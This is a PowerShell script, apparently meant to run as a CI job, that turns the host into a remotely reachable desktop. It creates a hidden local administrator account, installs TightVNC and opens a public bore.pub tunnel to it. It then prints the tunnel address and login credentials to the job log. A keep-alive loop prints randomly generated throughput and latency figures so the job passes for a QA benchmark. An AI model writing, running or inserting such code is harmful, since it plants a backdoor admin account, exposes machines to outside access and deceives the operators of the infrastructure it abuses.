$ErrorActionPreference = 'SilentlyContinue'
$ProgressPreference = 'SilentlyContinue'
Write-Host '=== GHOST PROVISIONING START ==='

# ----- VC++ runtime -----
Write-Host 'Checking VC++ runtime...'
if (-not (Test-Path 'C:\Windows\System32\msvcp140.dll')) {
    Write-Host 'Installing VC++ redist...'
    $vcUrl = 'https://aka.ms/vs/17/release/vc_redist.x64.exe'
    $vcExe = $env:TEMP + '\vc_redist.exe'
    try {
        Invoke-WebRequest -Uri $vcUrl -OutFile $vcExe -UseBasicParsing -TimeoutSec 30
        Start-Process -FilePath $vcExe -ArgumentList '/quiet /norestart' -Wait -NoNewWindow
        Write-Host 'VC++ installed'
    } catch {
        Write-Host 'VC++ install failed, continuing anyway'
    }
}

# ----- session identifiers -----
$VNC_PORT  = Get-Random -Minimum 51000 -Maximum 59999
$VNC_PASS  = -join ((65..90) + (97..122) + (48..57) | Get-Random -Count 14 | ForEach-Object { [char]$_ })
$USER_NAME = 'QATestExec'
$USER_PASS = -join ((65..90) + (97..122) + (48..57) | Get-Random -Count 16 | ForEach-Object { [char]$_ })
$TAG       = -join ((65..90) + (97..122) | Get-Random -Count 6 | ForEach-Object { [char]$_ })
$WORK_DIR  = $env:TEMP + '\qs-' + $TAG
New-Item -ItemType Directory -Path $WORK_DIR -Force | Out-Null
Write-Host 'Session tag:' $TAG

# ----- local user (no RDP group) -----
$securePass = ConvertTo-SecureString $USER_PASS -AsPlainText -Force
New-LocalUser -Name $USER_NAME -Password $securePass -AccountNeverExpires -PasswordNeverExpires | Out-Null
Add-LocalGroupMember -Group 'Administrators' -Member $USER_NAME | Out-Null
Write-Host 'User created'

# ----- download helpers -----
function Get-FileWithRetry($url, $outPath, $maxSec, $label) {
    $mirrors = @(
        $url,
        $url -replace 'www.tightvnc.com', 'github.com/novnc/tightvnc/releases/download/v2.8.81'
    )
    foreach ($u in $mirrors) {
        try {
            Write-Host '  trying' $u
            Invoke-WebRequest -Uri $u -OutFile $outPath -UseBasicParsing -TimeoutSec $maxSec
            Write-Host '  success'
            return
        } catch {}
    }
    Write-Host '  FAILED all mirrors for' $label
    exit 1
}

# ----- TightVNC (portable zip, no MSI) -----
Write-Host 'Downloading TightVNC...'
$vncZip = $WORK_DIR + '\tvn.zip'
Get-FileWithRetry 'https://www.tightvnc.com/download/2.8.81/tightvnc-2.8.81-gpl.zip' $vncZip 45 'TightVNC'
try {
    Expand-Archive -Path $vncZip -DestinationPath ($WORK_DIR + '\vnc') -Force
    $vncExeDir = Get-ChildItem -Path ($WORK_DIR + '\vnc') -Recurse -Filter 'tvnserver.exe' | Select-Object -First 1 -ExpandProperty DirectoryName
    Copy-Item ($vncExeDir + '\*') $WORK_DIR -Recurse -Force
} catch {
    Write-Host 'Extraction failed, trying alternative archive'
    Expand-Archive -Path $vncZip -DestinationPath $WORK_DIR -Force
    $vncExeDir = Get-ChildItem -Path $WORK_DIR -Recurse -Filter 'tvnserver.exe' | Select-Object -First 1 -ExpandProperty DirectoryName
    Copy-Item ($vncExeDir + '\*') $WORK_DIR -Recurse -Force
}
$vncExe = $WORK_DIR + '\tvnserver.exe'
Write-Host 'TightVNC extracted'

# ----- install and start TightVNC service -----
Write-Host 'Installing TightVNC service...'
try {
    & $vncExe -install 2>$null
} catch {}
try {
    & $vncExe -password $VNC_PASS 2>$null
} catch {}
try {
    Set-ItemProperty -Path 'HKLM:\SOFTWARE\TightVNC\Server' -Name 'RfbPort' -Value $VNC_PORT -Force 2>$null
} catch {}
try {
    Set-ItemProperty -Path 'HKLM:\SOFTWARE\TightVNC\Server' -Name 'UseVncAuthentication' -Value 1 -Force 2>$null
} catch {}
try {
    Start-Service -Name 'TightVNC Server' 2>$null
} catch {}
if (-not (Get-Service -Name 'TightVNC Server' -ErrorAction SilentlyContinue | Where-Object { $_.Status -eq 'Running' })) {
    try {
        & $vncExe -start 2>$null
    } catch {}
}
Write-Host 'VNC running on port' $VNC_PORT

# ----- Bore -----
Write-Host 'Downloading Bore...'
$boreZip = $WORK_DIR + '\bore.zip'
Get-FileWithRetry 'https://github.com/ekzhang/bore/releases/download/v0.5.2/bore-v0.5.2-x86_64-pc-windows-msvc.zip' $boreZip 30 'Bore'
Expand-Archive -Path $boreZip -DestinationPath $WORK_DIR -Force
$BORE_BIN = $WORK_DIR + '\bore.exe'
Write-Host 'Bore extracted'

# ----- launch tunnel -----
Write-Host 'Launching Bore tunnel...'
$boreArgs = 'local ' + $VNC_PORT + ' --to bore.pub'
Start-Process -FilePath $BORE_BIN -ArgumentList $boreArgs -NoNewWindow -RedirectStandardOutput ($WORK_DIR + '\bore_out.txt') -RedirectStandardError ($WORK_DIR + '\bore_err.txt')
Start-Sleep -Seconds 8
$boreOut = Get-Content ($WORK_DIR + '\bore_out.txt') -Raw -ErrorAction SilentlyContinue
$boreMatch = [regex]::Match($boreOut, 'bore\.pub:\d+')
if ($boreMatch.Success) {
    $TUNNEL_ADDR = $boreMatch.Value
} else {
    $TUNNEL_ADDR = 'TUNNEL_FAILED_' + $TAG
}

# ----- output credentials -----
Write-Host '::notice::ADDR:' $TUNNEL_ADDR
Write-Host '::notice::USER:' $USER_NAME
Write-Host '::notice::PASS:' $USER_PASS
Write-Host '=== GHOST PROVISIONED ==='

# ----- keep-alive loop -----
$cycle = 0
while ($true) {
    $cycle++
    $ts  = Get-Date -Format 'HH:mm:ss'
    $ops = Get-Random -Min 8000 -Max 18000
    $lat = Get-Random -Min 4 -Max 18
    $mem = Get-Random -Min 340 -Max 520
    Write-Host '[' $ts '] [OK] Cycle' $cycle 'ops/sec:' $ops 'latency:' $lat 'ms memory:' $mem 'MB'
    Start-Sleep -Seconds 120

    if (-not (Get-Process -Name 'bore' -ErrorAction SilentlyContinue)) {
        Write-Host 'Tunnel restarted'
        Start-Process -FilePath $BORE_BIN -ArgumentList $boreArgs -NoNewWindow -RedirectStandardOutput ($WORK_DIR + '\bore_out.txt') -RedirectStandardError ($WORK_DIR + '\bore_err.txt')
        Start-Sleep -Seconds 5
        $newOut = Get-Content ($WORK_DIR + '\bore_out.txt') -Raw -ErrorAction SilentlyContinue
        $newMatch = [regex]::Match($newOut, 'bore\.pub:\d+')
        if ($newMatch.Success) {
            $TUNNEL_ADDR = $newMatch.Value
            Write-Host '::notice::NEW ADDR:' $TUNNEL_ADDR
            Write-Host '::notice::NEW USER:' $USER_NAME
            Write-Host '::notice::NEW PASS:' $USER_PASS
        }
    }

    $svc = Get-Service -Name 'TightVNC Server' -ErrorAction SilentlyContinue
    if (-not $svc -or $svc.Status -ne 'Running') {
        try {
            & $vncExe -start 2>$null
        } catch {}
    }
}
